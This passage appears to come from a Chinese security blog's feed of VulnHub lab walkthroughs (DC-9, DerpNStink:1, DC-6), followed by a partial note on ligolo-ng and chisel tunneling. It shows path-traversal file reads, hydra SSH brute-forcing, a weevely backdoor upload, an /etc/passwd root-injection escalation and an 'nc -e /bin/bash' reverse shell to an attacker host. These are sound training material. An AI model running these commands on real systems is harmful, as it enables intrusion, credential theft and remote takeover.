exist”，很可能这个页面是存在LFI漏洞的，那我们可以测试一下常用的url参数。<br>且经过尝试，我们找到了这个knock服务的配置文件。（从ssh服务的状态是filtered我们也可以猜测可能是有防火墙或者knock服务）<br><img src="https://c5cc8144.telegraph-image-1ba.pages.dev/file/ff27021c07ae1c2189a26.png"><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">http://192.168.1.10/manage.php?file=../../../../etc/knockd.conf<br></code></pre></td></tr></table></figure>那我们接下来用这个顺序去敲门，然后再通过hydra爆破ssh服务，从/etc/passwd文件中也正好看到除了root外有17个用户，恰好和users库中的对应<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs bash">knock 192.168.1.10 7469 8475 9842 -v<br>hitting tcp 192.168.1.10:7469<br>hitting tcp 192.168.1.10:8475<br>hitting tcp 192.168.1.10:9842<br></code></pre></td></tr></table></figure>然后再检查ssh服务<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs bash">sudo nmap -p 22 192.168.1.10 -sV -sC                       <br>···<br>Host is up (0.00042s latency).<br>PORT   STATE SERVICE VERSION<br>22/tcp open  ssh     OpenSSH 7.9p1 Debian 10+deb10u1 (protocol 2.0)<br>···<br></code></pre></td></tr></table></figure>用hydra进行爆破<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs bash">hydra -L <span class="hljs-built_in">users</span> -P passwds 192.168.1.10 ssh -t 4 -I<br>···<br>[DATA] attacking ssh://192.168.1.10:22/<br>[STATUS] 92.00 tries/min, 92 tries <span class="hljs-keyword">in</span> 00:01h, 214 to <span class="hljs-keyword">do</span> <span class="hljs-keyword">in</span> 00:03h, 4 active<br>[22][ssh] host: 192.168.1.10   login: chandlerb   password: UrAG0D!<br>[22][ssh] host: 192.168.1.10   login: joeyt   password: Passw0rd<br>[STATUS] 94.00 tries/min, 282 tries <span class="hljs-keyword">in</span> 00:03h, 24 to <span class="hljs-keyword">do</span> <span class="hljs-keyword">in</span> 00:01h, 4 active<br>[22][ssh] host: 192.168.1.10   login: janitor   password: Ilovepeepee<br>1 of 1 target successfully completed, 3 valid passwords found<br>···<br></code></pre></td></tr></table></figure>在janitor账户中，我们使用linpeas.sh找到了另外的一些密码，加入进我们的密码字典，然后继续喷洒以下ssh<br><img src="https://c5cc8144.telegraph-image-1ba.pages.dev/file/eb0e0a8787ac9e817f7f8.png"></li></ul><h1 id="🛡️-提升权限"><a href="#🛡️-提升权限" class="headerlink" title="🛡️ 提升权限"></a>🛡️ 提升权限</h1><p>用找到的新密码继续喷洒</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs bash">hydra -L <span class="hljs-built_in">users</span> -P passwds 192.168.1.10 ssh -t 4 -I<br>···<br>[DATA] attacking ssh://192.168.1.10:22/<br>[STATUS] 40.00 tries/min, 40 tries <span class="hljs-keyword">in</span> 00:01h, 334 to <span class="hljs-keyword">do</span> <span class="hljs-keyword">in</span> 00:09h, 4 active<br>[22][ssh] host: 192.168.1.10   login: fredf   password: B4-Tru3-001<br>[STATUS] 48.00 tries/min, 144 tries <span class="hljs-keyword">in</span> 00:03h, 230 to <span class="hljs-keyword">do</span> <span class="hljs-keyword">in</span> 00:05h, 4 active<br>····<br></code></pre></td></tr></table></figure><p>找到了一个新的用户凭证，登录上之后发现有sudo命令<br><img src="https://c5cc8144.telegraph-image-1ba.pages.dev/file/be9c08b265c02e4d632d3.png"><br>我们查看/opt/devstuff目录下存在二进制文件的源码，简单看过之后可以发现是将read文件里的加到第二个文件中去<br><img src="https://c5cc8144.telegraph-image-1ba.pages.dev/file/7dce34921d4d40a9ad9ac.png"><br>既然如此，那我们就可以在passwd中加一段进行提权<br>首先在本地生成密码hash值</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs bash">mkpasswd -m sha-512 root<br>$6$KpgoDDyFhkOcig11<span class="hljs-variable">$T1rC3qwEWHiTDQLJ1NUyY7W08</span>/xowH7Wsfak6CW1iV/8m0mC2hAgQOWBNBXYNlgGeyQCbgdCeIERWt8s5QS3e0<br></code></pre></td></tr></table></figure><p>将这一段保存进文件a中，然后使用sudo，将这一段加入/etc/passwd中</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">root:$6$KpgoDDyFhkOcig11<span class="hljs-variable">$T1rC3qwEWHiTDQLJ1NUyY7W08</span>/xowH7Wsfak6CW1iV/8m0mC2hAgQOWBNBXYNlgGeyQCbgdCeIERWt8s5QS3e0:0:0:root:/root:/bin/bash<br></code></pre></td></tr></table></figure><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">sudo /opt/devstuff/dist/test/test a /etc/passwd<br></code></pre></td></tr></table></figure><p>检查/etc/passwd中是否加入我们这一段</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-built_in">cat</span> /etc/passwd<br>···<br>root1:$6$KpgoDDyFhkOcig11<span class="hljs-variable">$T1rC3qwEWHiTDQLJ1NUyY7W08</span>/xowH7Wsfak6CW1iV/8m0mC2hAgQOWBNBXYNlgGeyQCbgdCeIERWt8s5QS3e0:0:0:root:/root:/bin/bash<br>···<br></code></pre></td></tr></table></figure><p>既然已经加入，那我们直接切换到root1用户<br><img src="https://c5cc8144.telegraph-image-1ba.pages.dev/file/3a8ec881c4a17ed9b73a8.png"></p><h1 id="📖-推荐文章"><a href="#📖-推荐文章" class="headerlink" title="📖 推荐文章"></a>📖 推荐文章</h1><p><a href="https://www.vulnhub.com/entry/dc-9,412/">DC-9靶机地址</a></p>]]></content>
    
    
    <categories>
      
      <category>vulnhub</category>
      
    </categories>
    
    
    <tags>
      
      <tag>vulnhub</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>vulnhub-wp DerpNStink:1</title>
    <link href="/vulnhub-wp-DerpNStink-1/"/>
    <url>/vulnhub-wp-DerpNStink-1/</url>
    
    <content type="html"><![CDATA[<h1 id="🖳-主机发现"><a href="#🖳-主机发现" class="headerlink" title="🖳 主机发现"></a>🖳 主机发现</h1><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs bash">sudo netdiscover -r 192.168.1.0/24<br> Currently scanning: Finished!   |   Screen View: Unique Hosts                                     <br>                                                                                                   <br> 16 Captured ARP Req/Rep packets, from 6 hosts.   Total size: 960                                  <br> _____________________________________________________________________________<br>   IP            At MAC Address     Count     Len  MAC Vendor / Hostname      <br> -----------------------------------------------------------------------------                           <br> 192.168.1.5     20:1e:88:ad:<span class="hljs-built_in">fc</span>:55      1      60  Intel Corporate                                 <br> 192.168.1.7     08:00:27:38:ee:93      1      60  PCS Systemtechnik GmbH                                   <br> 192.168.1.3     a2:86:90:e6:04:98      2     120  Unknown vendor                            <br></code></pre></td></tr></table></figure><p>目标是<em>192.168.1.7</em></p><h1 id="👁-服务扫描"><a href="#👁-服务扫描" class="headerlink" title="👁 服务扫描"></a>👁 服务扫描</h1><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-comment"># Nmap 7.94SVN scan initiated Mon Feb 19 16:02:25 2024 as: nmap -p- -oN nmap_scan -sV -sC --min-rate 5000 192.168.1.7</span><br>Nmap scan report <span class="hljs-keyword">for</span> 192.168.1.7 (192.168.1.7)<br>Host is up (0.00040s latency).<br>Not shown: 65532 closed tcp ports (reset)<br>PORT   STATE SERVICE VERSION<br>21/tcp open  ftp     vsftpd 3.0.2<br>22/tcp open  ssh     OpenSSH 6.6.1p1 Ubuntu 2ubuntu2.8 (Ubuntu Linux; protocol 2.0)<br>| ssh-hostkey: <br>|   1024 12:4e:f8:6e:7b:6c:c6:d8:7c:d8:29:77:d1:0b:eb:72 (DSA)<br>|   2048 72:c5:1c:5f:81:7b:<span class="hljs-built_in">dd</span>:1a:fb:2e:59:67:fe:a6:91:2f (RSA)<br>|   256 06:77:0f:4b:96:0a:3a:2c:3b:f0:8c:2b:57:b5:97:bc (ECDSA)<br>|_  256 28:e8:ed:7c:60:7f:19:6c:e3:24:79:31:ca:ab:5d:2d (ED25519)<br>80/tcp open  http    Apache httpd 2.4.7 ((Ubuntu))<br>|_http-server-header: Apache/2.4.7 (Ubuntu)<br>|_http-title: DeRPnStiNK<br>| http-robots.txt: 2 disallowed entries <br>|_/php/ /temporary/<br>MAC Address: 08:00:27:38:EE:93 (Oracle VirtualBox virtual NIC)<br>Service Info: OSs: Unix, Linux; CPE: cpe:/o:linux:linux_kernel<br><br>Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .<br><span class="hljs-comment"># Nmap done at Mon Feb 19 16:02:34 2024 -- 1 IP address (1 host up) scanned in 8.81 seconds</span><br></code></pre></td></tr></table></figure><p>第一个flag藏在主页的源代码里.然后用dirb工具爆破目录，发现了一个weblog目录</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">dirb http://192.168.1.7<br></code></pre></td></tr></table></figure><p>访问之后发现是一个wordpress博客。通过尝试可以知道能通过弱口令<code>admin:admin</code>登录上后台，但是貌似admin并不是管理员用户，但是我们可以发现一个slideshow插件，在exploitdb可以搜索到漏洞。<br>exploit：<code>https://www.exploit-db.com/exploits/34681</code></p><h1 id="🚪🚶-获取权限"><a href="#🚪🚶-获取权限" class="headerlink" title="🚪🚶 获取权限"></a>🚪🚶 获取权限</h1><p>先用weevely生成一个后门</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">weevely generate admin back.php<br></code></pre></td></tr></table></figure><ul><li><code>admin</code> 指定后门密码<br>然后用利用漏洞代码上传后门（其实直接上传也可以）<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">python2 34681.py -t 192.168.1.7/weblog -f back.php -u admin -p admin<br></code></pre></td></tr></table></figure>然后用weevely连接<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">weevely http://derpnstink.local/weblog/wp-content/uploads/slideshow-gallery/backdoor.php admin<br></code></pre></td></tr></table></figure>然后得到了一个简易的shell，我们也可以再用bash反弹一个shell回去。<br>然后用linpeas.sh进行自动枚举，发现了一些数据库的密码，在<em>192.168.1.7/php</em>的目录下是有一个phpmyadmin（可通过dirb扫描出来）的，我们用找到的用户名和密码登录<br><img src="https://c5cc8144.telegraph-image-1ba.pages.dev/file/0aba081c2421d1866a869.png"><br>登录上之后，在mysql.user表里面找到了unclestinky的用户名和密码<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">unclestinky:*9B776AFB479B31E8047026F1185E952DD1E530CB<br></code></pre></td></tr></table></figure>该密码可在网站<a href="https://crackstation.net/"><em>crackstation</em></a> 处破解，得到凭证<code>unclestinky:wedgie57</code><br>然后在wordpress.wp-users表里面找到unclestinky的用户名和密码<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">unclestinky:$P<span class="hljs-variable">$BW6NTkFvboVVCHU2R9qmNai1WfHSC41</span><br></code></pre></td></tr></table></figure><h1 id="🛡️-提升权限"><a href="#🛡️-提升权限" class="headerlink" title="🛡️ 提升权限"></a>🛡️ 提升权限</h1>考虑到密码的复用性，我们可以用这个密码去登录stinky用户，使用sh切换到stinky用户，然后输入密码，成功登录。<br>在stinky的目录下找到一个文件，里面有一些提示，在给用户mrderp修复的时候，抓了流量包，找到这个流量包也许我们可以从中找到mrderp的密码<br><img src="https://c5cc8144.telegraph-image-1ba.pages.dev/file/02004c28e179b4243bf38.png"><br>用wireshark打开后追踪tcp流，在第37个tcp流的时候，找到了关键信息。也可以直接筛选http，因为有提示过和修改wordpress的密码有关。<br><img src="https://c5cc8144.telegraph-image-1ba.pages.dev/file/a408631ca42fd4997260f.png"><br>我们得到了用户mrderp的口令derpderpderpderpderpderpderp。得到口令后拿去ssh尝试登录，登录成功。<br><img src="https://c5cc8144.telegraph-image-1ba.pages.dev/file/c0df6fca664071c5aa055.png"><br>根据提示我们检查一下sudo，发现我们可以执行一个特定目录下的任意derpy开头的命令，那这样我们直接把bash文件复制一个到这个目录下。由于这个目录不存在，我们需要创建一下。<br><img src="https://c5cc8144.telegraph-image-1ba.pages.dev/file/487151257359e31c45f40.png"><br>最终拿下root权限。<h1 id="📖-推荐文章"><a href="#📖-推荐文章" class="headerlink" title="📖 推荐文章"></a>📖 推荐文章</h1><a href="https://www.vulnhub.com/entry/derpnstink-1,221/">DerpNStink靶机下载地址</a></li></ul>]]></content>
    
    
    <categories>
      
      <category>vulnhub</category>
      
    </categories>
    
    
    <tags>
      
      <tag>vulnhub</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>vulnhub-wp DC-6</title>
    <link href="/vulnhub-wp-DC-6/"/>
    <url>/vulnhub-wp-DC-6/</url>
    
    <content type="html"><![CDATA[<h1 id="🖳-主机发现"><a href="#🖳-主机发现" class="headerlink" title="🖳 主机发现"></a>🖳 主机发现</h1><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><code class="hljs bash">sudo netdiscover -i eth0 -r 192.168.1.0/24<br> Currently scanning: Finished!   |   Screen View: Unique Hosts                                     <br>                                                                                                   <br> 21 Captured ARP Req/Rep packets, from 6 hosts.   Total size: 1260                                 <br> _____________________________________________________________________________<br>   IP            At MAC Address     Count     Len  MAC Vendor / Hostname      <br> -----------------------------------------------------------------------------<br> 192.168.1.1     28:c8:7c:19:bf:e8     13     780  zte corporation                                 <br> 192.168.1.5     20:1e:88:ad:<span class="hljs-built_in">fc</span>:55      1      60  Intel Corporate                                 <br> 192.168.1.4     c4:e1:a1:cf:47:95      4     240  GUANGDONG OPPO MOBILE TELECOMMUNICATIONS CORP.,L<br> 192.168.1.6     0c:d8:6c:a5:e7:a1      1      60  SHENZHEN FAST TECHNOLOGIES CO.,LTD              <br> 192.168.1.14    08:00:27:e2:b6:88      1      60  PCS Systemtechnik GmbH                          <br> 192.168.1.3     a2:86:90:e6:04:98      1      60  Unknown vendor<br></code></pre></td></tr></table></figure><p>目标是<em>192.168.1.14</em></p><h1 id="👁-服务扫描"><a href="#👁-服务扫描" class="headerlink" title="👁 服务扫描"></a>👁 服务扫描</h1><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-comment"># Nmap 7.94SVN scan initiated Fri Feb 16 15:50:20 2024 as: nmap -p- -oN nmap_scan -sV -sC --min-rate 5000 192.168.1.14</span><br>Nmap scan report <span class="hljs-keyword">for</span> 192.168.1.14 (192.168.1.14)<br>Host is up (0.0016s latency).<br>Not shown: 65533 closed tcp ports (reset)<br>PORT   STATE SERVICE VERSION<br>22/tcp open  ssh     OpenSSH 7.4p1 Debian 10+deb9u6 (protocol 2.0)<br>| ssh-hostkey: <br>|   2048 3e:52:ce:ce:01:b6:94:eb:7b:03:7d:be:08:7f:5f:fd (RSA)<br>|   256 3c:83:65:71:<span class="hljs-built_in">dd</span>:73:d7:23:f8:83:0d:e3:46:bc:b5:6f (ECDSA)<br>|_  256 41:89:9e:85:ae:30:5b:e0:8f:a4:68:71:06:b4:15:ee (ED25519)<br>80/tcp open  http    Apache httpd 2.4.25 ((Debian))<br>|_http-title: Did not follow redirect to http://wordy/<br>|_http-server-header: Apache/2.4.25 (Debian)<br>MAC Address: 08:00:27:E2:B6:88 (Oracle VirtualBox virtual NIC)<br>Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel<br><br>Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .<br><span class="hljs-comment"># Nmap done at Fri Feb 16 15:50:28 2024 -- 1 IP address (1 host up) scanned in 8.69 seconds</span><br></code></pre></td></tr></table></figure><p>发现重定向到*<a href="http://wordy/*%E8%BF%99%E4%B8%AA%E7%BD%91%E7%AB%99%EF%BC%8C%E6%88%91%E4%BB%AC%E6%8A%8A%E5%AE%83%E5%8A%A0%E5%85%A5hosts%E6%96%87%E4%BB%B6%E4%B8%AD">http://wordy/*这个网站，我们把它加入hosts文件中</a><br>发现主页是一个wordpress网站，对其进行扫描</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><code class="hljs bash">wpscan -e vt,vp,u --url http://wordy/<br>[+] admin<br> | Found By: Rss Generator (Passive Detection)<br> | Confirmed By:<br> |  Wp Json Api (Aggressive Detection)<br> |   - http://wordy/index.php/wp-json/wp/v2/users/?per_page=100&amp;page=1<br> |  Author Id Brute Forcing - Author Pattern (Aggressive Detection)<br> |  Login Error Messages (Aggressive Detection)<br><br>[+] graham<br> | Found By: Author Id Brute Forcing - Author Pattern (Aggressive Detection)<br> | Confirmed By: Login Error Messages (Aggressive Detection)<br><br>[+] sarah<br> | Found By: Author Id Brute Forcing - Author Pattern (Aggressive Detection)<br> | Confirmed By: Login Error Messages (Aggressive Detection)<br><br>[+] jens<br> | Found By: Author Id Brute Forcing - Author Pattern (Aggressive Detection)<br> | Confirmed By: Login Error Messages (Aggressive Detection)<br><br>[+] mark<br> | Found By: Author Id Brute Forcing - Author Pattern (Aggressive Detection)<br> | Confirmed By: Login Error Messages (Aggressive Detection)<br><br></code></pre></td></tr></table></figure><p>发现了很多用户，记录下来，然后尝试一下登录界面的弱口令，没有试出弱口令，那就尝试爆破，因为爆破路径也没有什么有趣的，那攻击向量只有web喝ssh，web又只有这个登录页面是暴露的。<br>根据作者的提示，生成一下密码字典</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-built_in">cat</span> /usr/share/wordlists/rockyou.txt | grep k01 &gt; passwords.txt<br></code></pre></td></tr></table></figure><p>尝试爆破</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">wpscan --url http://wordy -U <span class="hljs-built_in">users</span> -P passwords.txt<br></code></pre></td></tr></table></figure><p>得到了凭证 </p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">mark:helpdesk01<br></code></pre></td></tr></table></figure><h1 id="🚪🚶-获取权限"><a href="#🚪🚶-获取权限" class="headerlink" title="🚪🚶 获取权限"></a>🚪🚶 获取权限</h1><p>登录上之后，发现有一个<em>Activity Monitor</em>，搜索一下有没有漏洞</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs bash">searchsploit Activity<br>···<br>WordPress Plugin Plainview Activity Monitor 20161228 - (Authenticated) Command Injection                                                | php/webapps/45274.html<br>WordPress Plugin Plainview Activity Monitor 20161228 - Remote Code Execution (RCE) (Authenticated) (2)                                  | php/webapps/50110.py<br>···<br></code></pre></td></tr></table></figure><p>我们使用下面那个，执行之后输入ip，username，password，然后用nc反弹shell。</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">nc -e /bin/bash 192.168.1.13 443<br></code></pre></td></tr></table></figure><h1 id="🛡️-提升权限"><a href="#🛡️-提升权限" class="headerlink" title="🛡️ 提升权限"></a>🛡️ 提升权限</h1><p>用linpeas.sh辅助提权脚本枚举信息<br><img src="https://c5cc8144.telegraph-image-1ba.pages.dev/file/a54b810a6e27fefc7e8db.png"><br>这里有俩个有趣的文件，我们可以在things-to-do.txt中发现用户gaham的凭证<br><img src="https://c5cc8144.telegraph-image-1ba.pages.dev/file/8b10f861a463c18398f89.png"><br>我们用ssh登录上去，后进行一些枚举，发现可以以jens身份运行backups.sh脚本，且因为gaham用户是devs组，对该脚本有修改权限，我们可以在里面加一个<code>/bin/bash</code>来启动一个jens用户的shell<br><img src="https://c5cc8144.telegraph-image-1ba.pages.dev/file/706974a57024e476b0702.png"></p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">sudo -u jens ./backups.sh<br></code></pre></td></tr></table></figure><p>或者jens的shell后，再次使用<code>sudo -l</code>进行检查<br><img src="https://c5cc8144.telegraph-image-1ba.pages.dev/file/2f072dfe50fc9ee334d4d.png"><br>然后在GTFOBins搜索nmap<br><a href="https://gtfobins.github.io/gtfobins/nmap/#sudo">https://gtfobins.github.io/gtfobins/nmap/#sudo</a><br>最终拿到root的shell<br><img src="https://c5cc8144.telegraph-image-1ba.pages.dev/file/644bc544563afde180665.png"></p><h1 id="📖-推荐文章"><a href="#📖-推荐文章" class="headerlink" title="📖 推荐文章"></a>📖 推荐文章</h1><p><a href="https://www.vulnhub.com/entry/dc-6,315/">DC-6下载地址</a><br><a href="https://www.sevenlayers.com/index.php/194-vulnhub-dc-6-walkthrough">DC-6国外大佬walkthrough文章</a><br><a href="https://gtfobins.github.io/">GTFOBins地址</a></p>]]></content>
    
    
    <categories>
      
      <category>vulnhub</category>
      
    </categories>
    
    
    <tags>
      
      <tag>vulnhub</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>Port redirection &amp;&amp; Tunnel</title>
    <link href="/Port-redirection-Tunnel/"/>
    <url>/Port-redirection-Tunnel/</url>
    
    <content type="html"><![CDATA[<h1 id="ligolo-ng"><a href="#ligolo-ng" class="headerlink" title="ligolo-ng"></a>ligolo-ng</h1><p>初始化操作：</p><figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs routeros">sudo<span class="hljs-built_in"> ip </span>tuntap <span class="hljs-built_in">add</span><span class="hljs-built_in"> user </span>/your_username/ mode tun ligolo<br>sudo<span class="hljs-built_in"> ip </span>link <span class="hljs-built_in">set</span> ligolo up<br></code></pre></td></tr></table></figure><p>启动服务端：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">./proxy -selfcert<br></code></pre></td></tr></table></figure><p>客户端连接（在内网机器上执行，要求能出网）：<br>windows:</p><figure class="highlight arduino"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs arduino">.\agent.exe -connect <span class="hljs-number">192.168</span><span class="hljs-number">.45</span><span class="hljs-number">.248</span>:<span class="hljs-number">11601</span> -ignore-cert<br></code></pre></td></tr></table></figure><p>linux:</p><figure class="highlight arduino"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs arduino">./agent -connect <span class="hljs-number">192.168</span><span class="hljs-number">.45</span><span class="hljs-number">.153</span>:<span class="hljs-number">11601</span> -ignore-cert<br></code></pre></td></tr></table></figure><p>随后在服务端添加网段：</p><figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs routeros">sudo<span class="hljs-built_in"> ip route </span><span class="hljs-built_in">add</span> 172.16.216.0/24 dev ligolo<br></code></pre></td></tr></table></figure><p>然后选择session并启动隧道连接<br>session命令选择session，然后输入start启动连接<br>随后便可以使用nmap扫描内网：</p><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">nmap</span> -sn <span class="hljs-number">172.16.1.0</span>/<span class="hljs-number">24</span><br></code></pre></td></tr></table></figure><p>设置监听器：</p><figure class="highlight nginx"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs nginx"><span class="hljs-attribute">listener_add</span> --addr <span class="hljs-number">0.0.0.0:443</span> --to <span class="hljs-number">127.0.0.1:443</span><br></code></pre></td></tr></table></figure><p>可以用来接收反弹的shell和创建web服务传输文件，使用listener_list可以查看监听器列表</p><h1 id="chisel"><a href="#chisel" class="headerlink" title="chisel"></a>chisel</h1><p>客户端和服务器版本应该相同<br>它无法在内网中监听反向shell!!!</p><p>由于其特殊性，有时不会被防火墙等发现或阻止。<br>但是执行nmap扫描时会花费更多时间，因为socks代理只支持TCP扫描。而chisel无法接收反向shell。</p><h2 id="socks-代理"><a href="#socks-代理" class="headerlink" title="socks 代理"></a>socks 代理</h2><p>kali:</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">chisel 服务器 --port 8080 --reverse<br></code></pre></td></tr></table></figure><p>目标:<br>后台运行</p><figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs powershell"><span class="hljs-built_in">Start-Job</span> <span class="hljs-literal">-ScriptBlock</span> &#123; c:\my\chisel.exe 客户端 <span class="hljs-number">192.168</span>.<span class="hljs-number">45.218</span>:<span class="hljs-number">8080</span> <span class="hljs-built_in">R</span>:socks &#125;<br></code></pre></td></tr></table></figure><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">/tmp/chisel 客户端 192.168.45.153:8080 R:socks &gt; /dev/null 2&gt;&amp;1 &amp;<br></code></pre></td></tr></table></figure><p>直接运行</p><figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs powershell">c:\my\chisel.exe 客户端 <span class="hljs-number">192.168</span>.<span class="hljs-number">45.218</span>:<span class="hljs-number">8080</span> <span class="hljs-built_in">R</span>:socks<br></code></pre></td></tr></table></figure><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">/tmp/chisel 客户端 192.168.45.153:8080 R:socks<br></code></pre></td></tr></table></figure><p>然后使用代理执行命令与内网通信</p><h2 id="端口转发"><a href="#端口转发" class="headerlink" title="端口转发"></a>端口转发</h2><p>反向模式：将客户端的 <code>remote:port</code> 共享给服务器的 <code>local:port</code><br>严格模式：将服务器的 <code>remote:port</code> 共享给客户端的 <code>local:port</code><br>反向连接比正向连接更常见。因为防火墙会阻止我们主动连接到目标服务器：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">chisel 服务器 --port 8080 --reverse<br></code></pre></td></tr></table></figure><figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs powershell">chisel.exe 服务器 <span class="hljs-literal">--port</span> <span class="hljs-number">8080</span> <span class="hljs-literal">--reverse</span><br></code></pre></td></tr></table></figure><p>客户端：</p><figure class="highlight bash"><table><tr><td 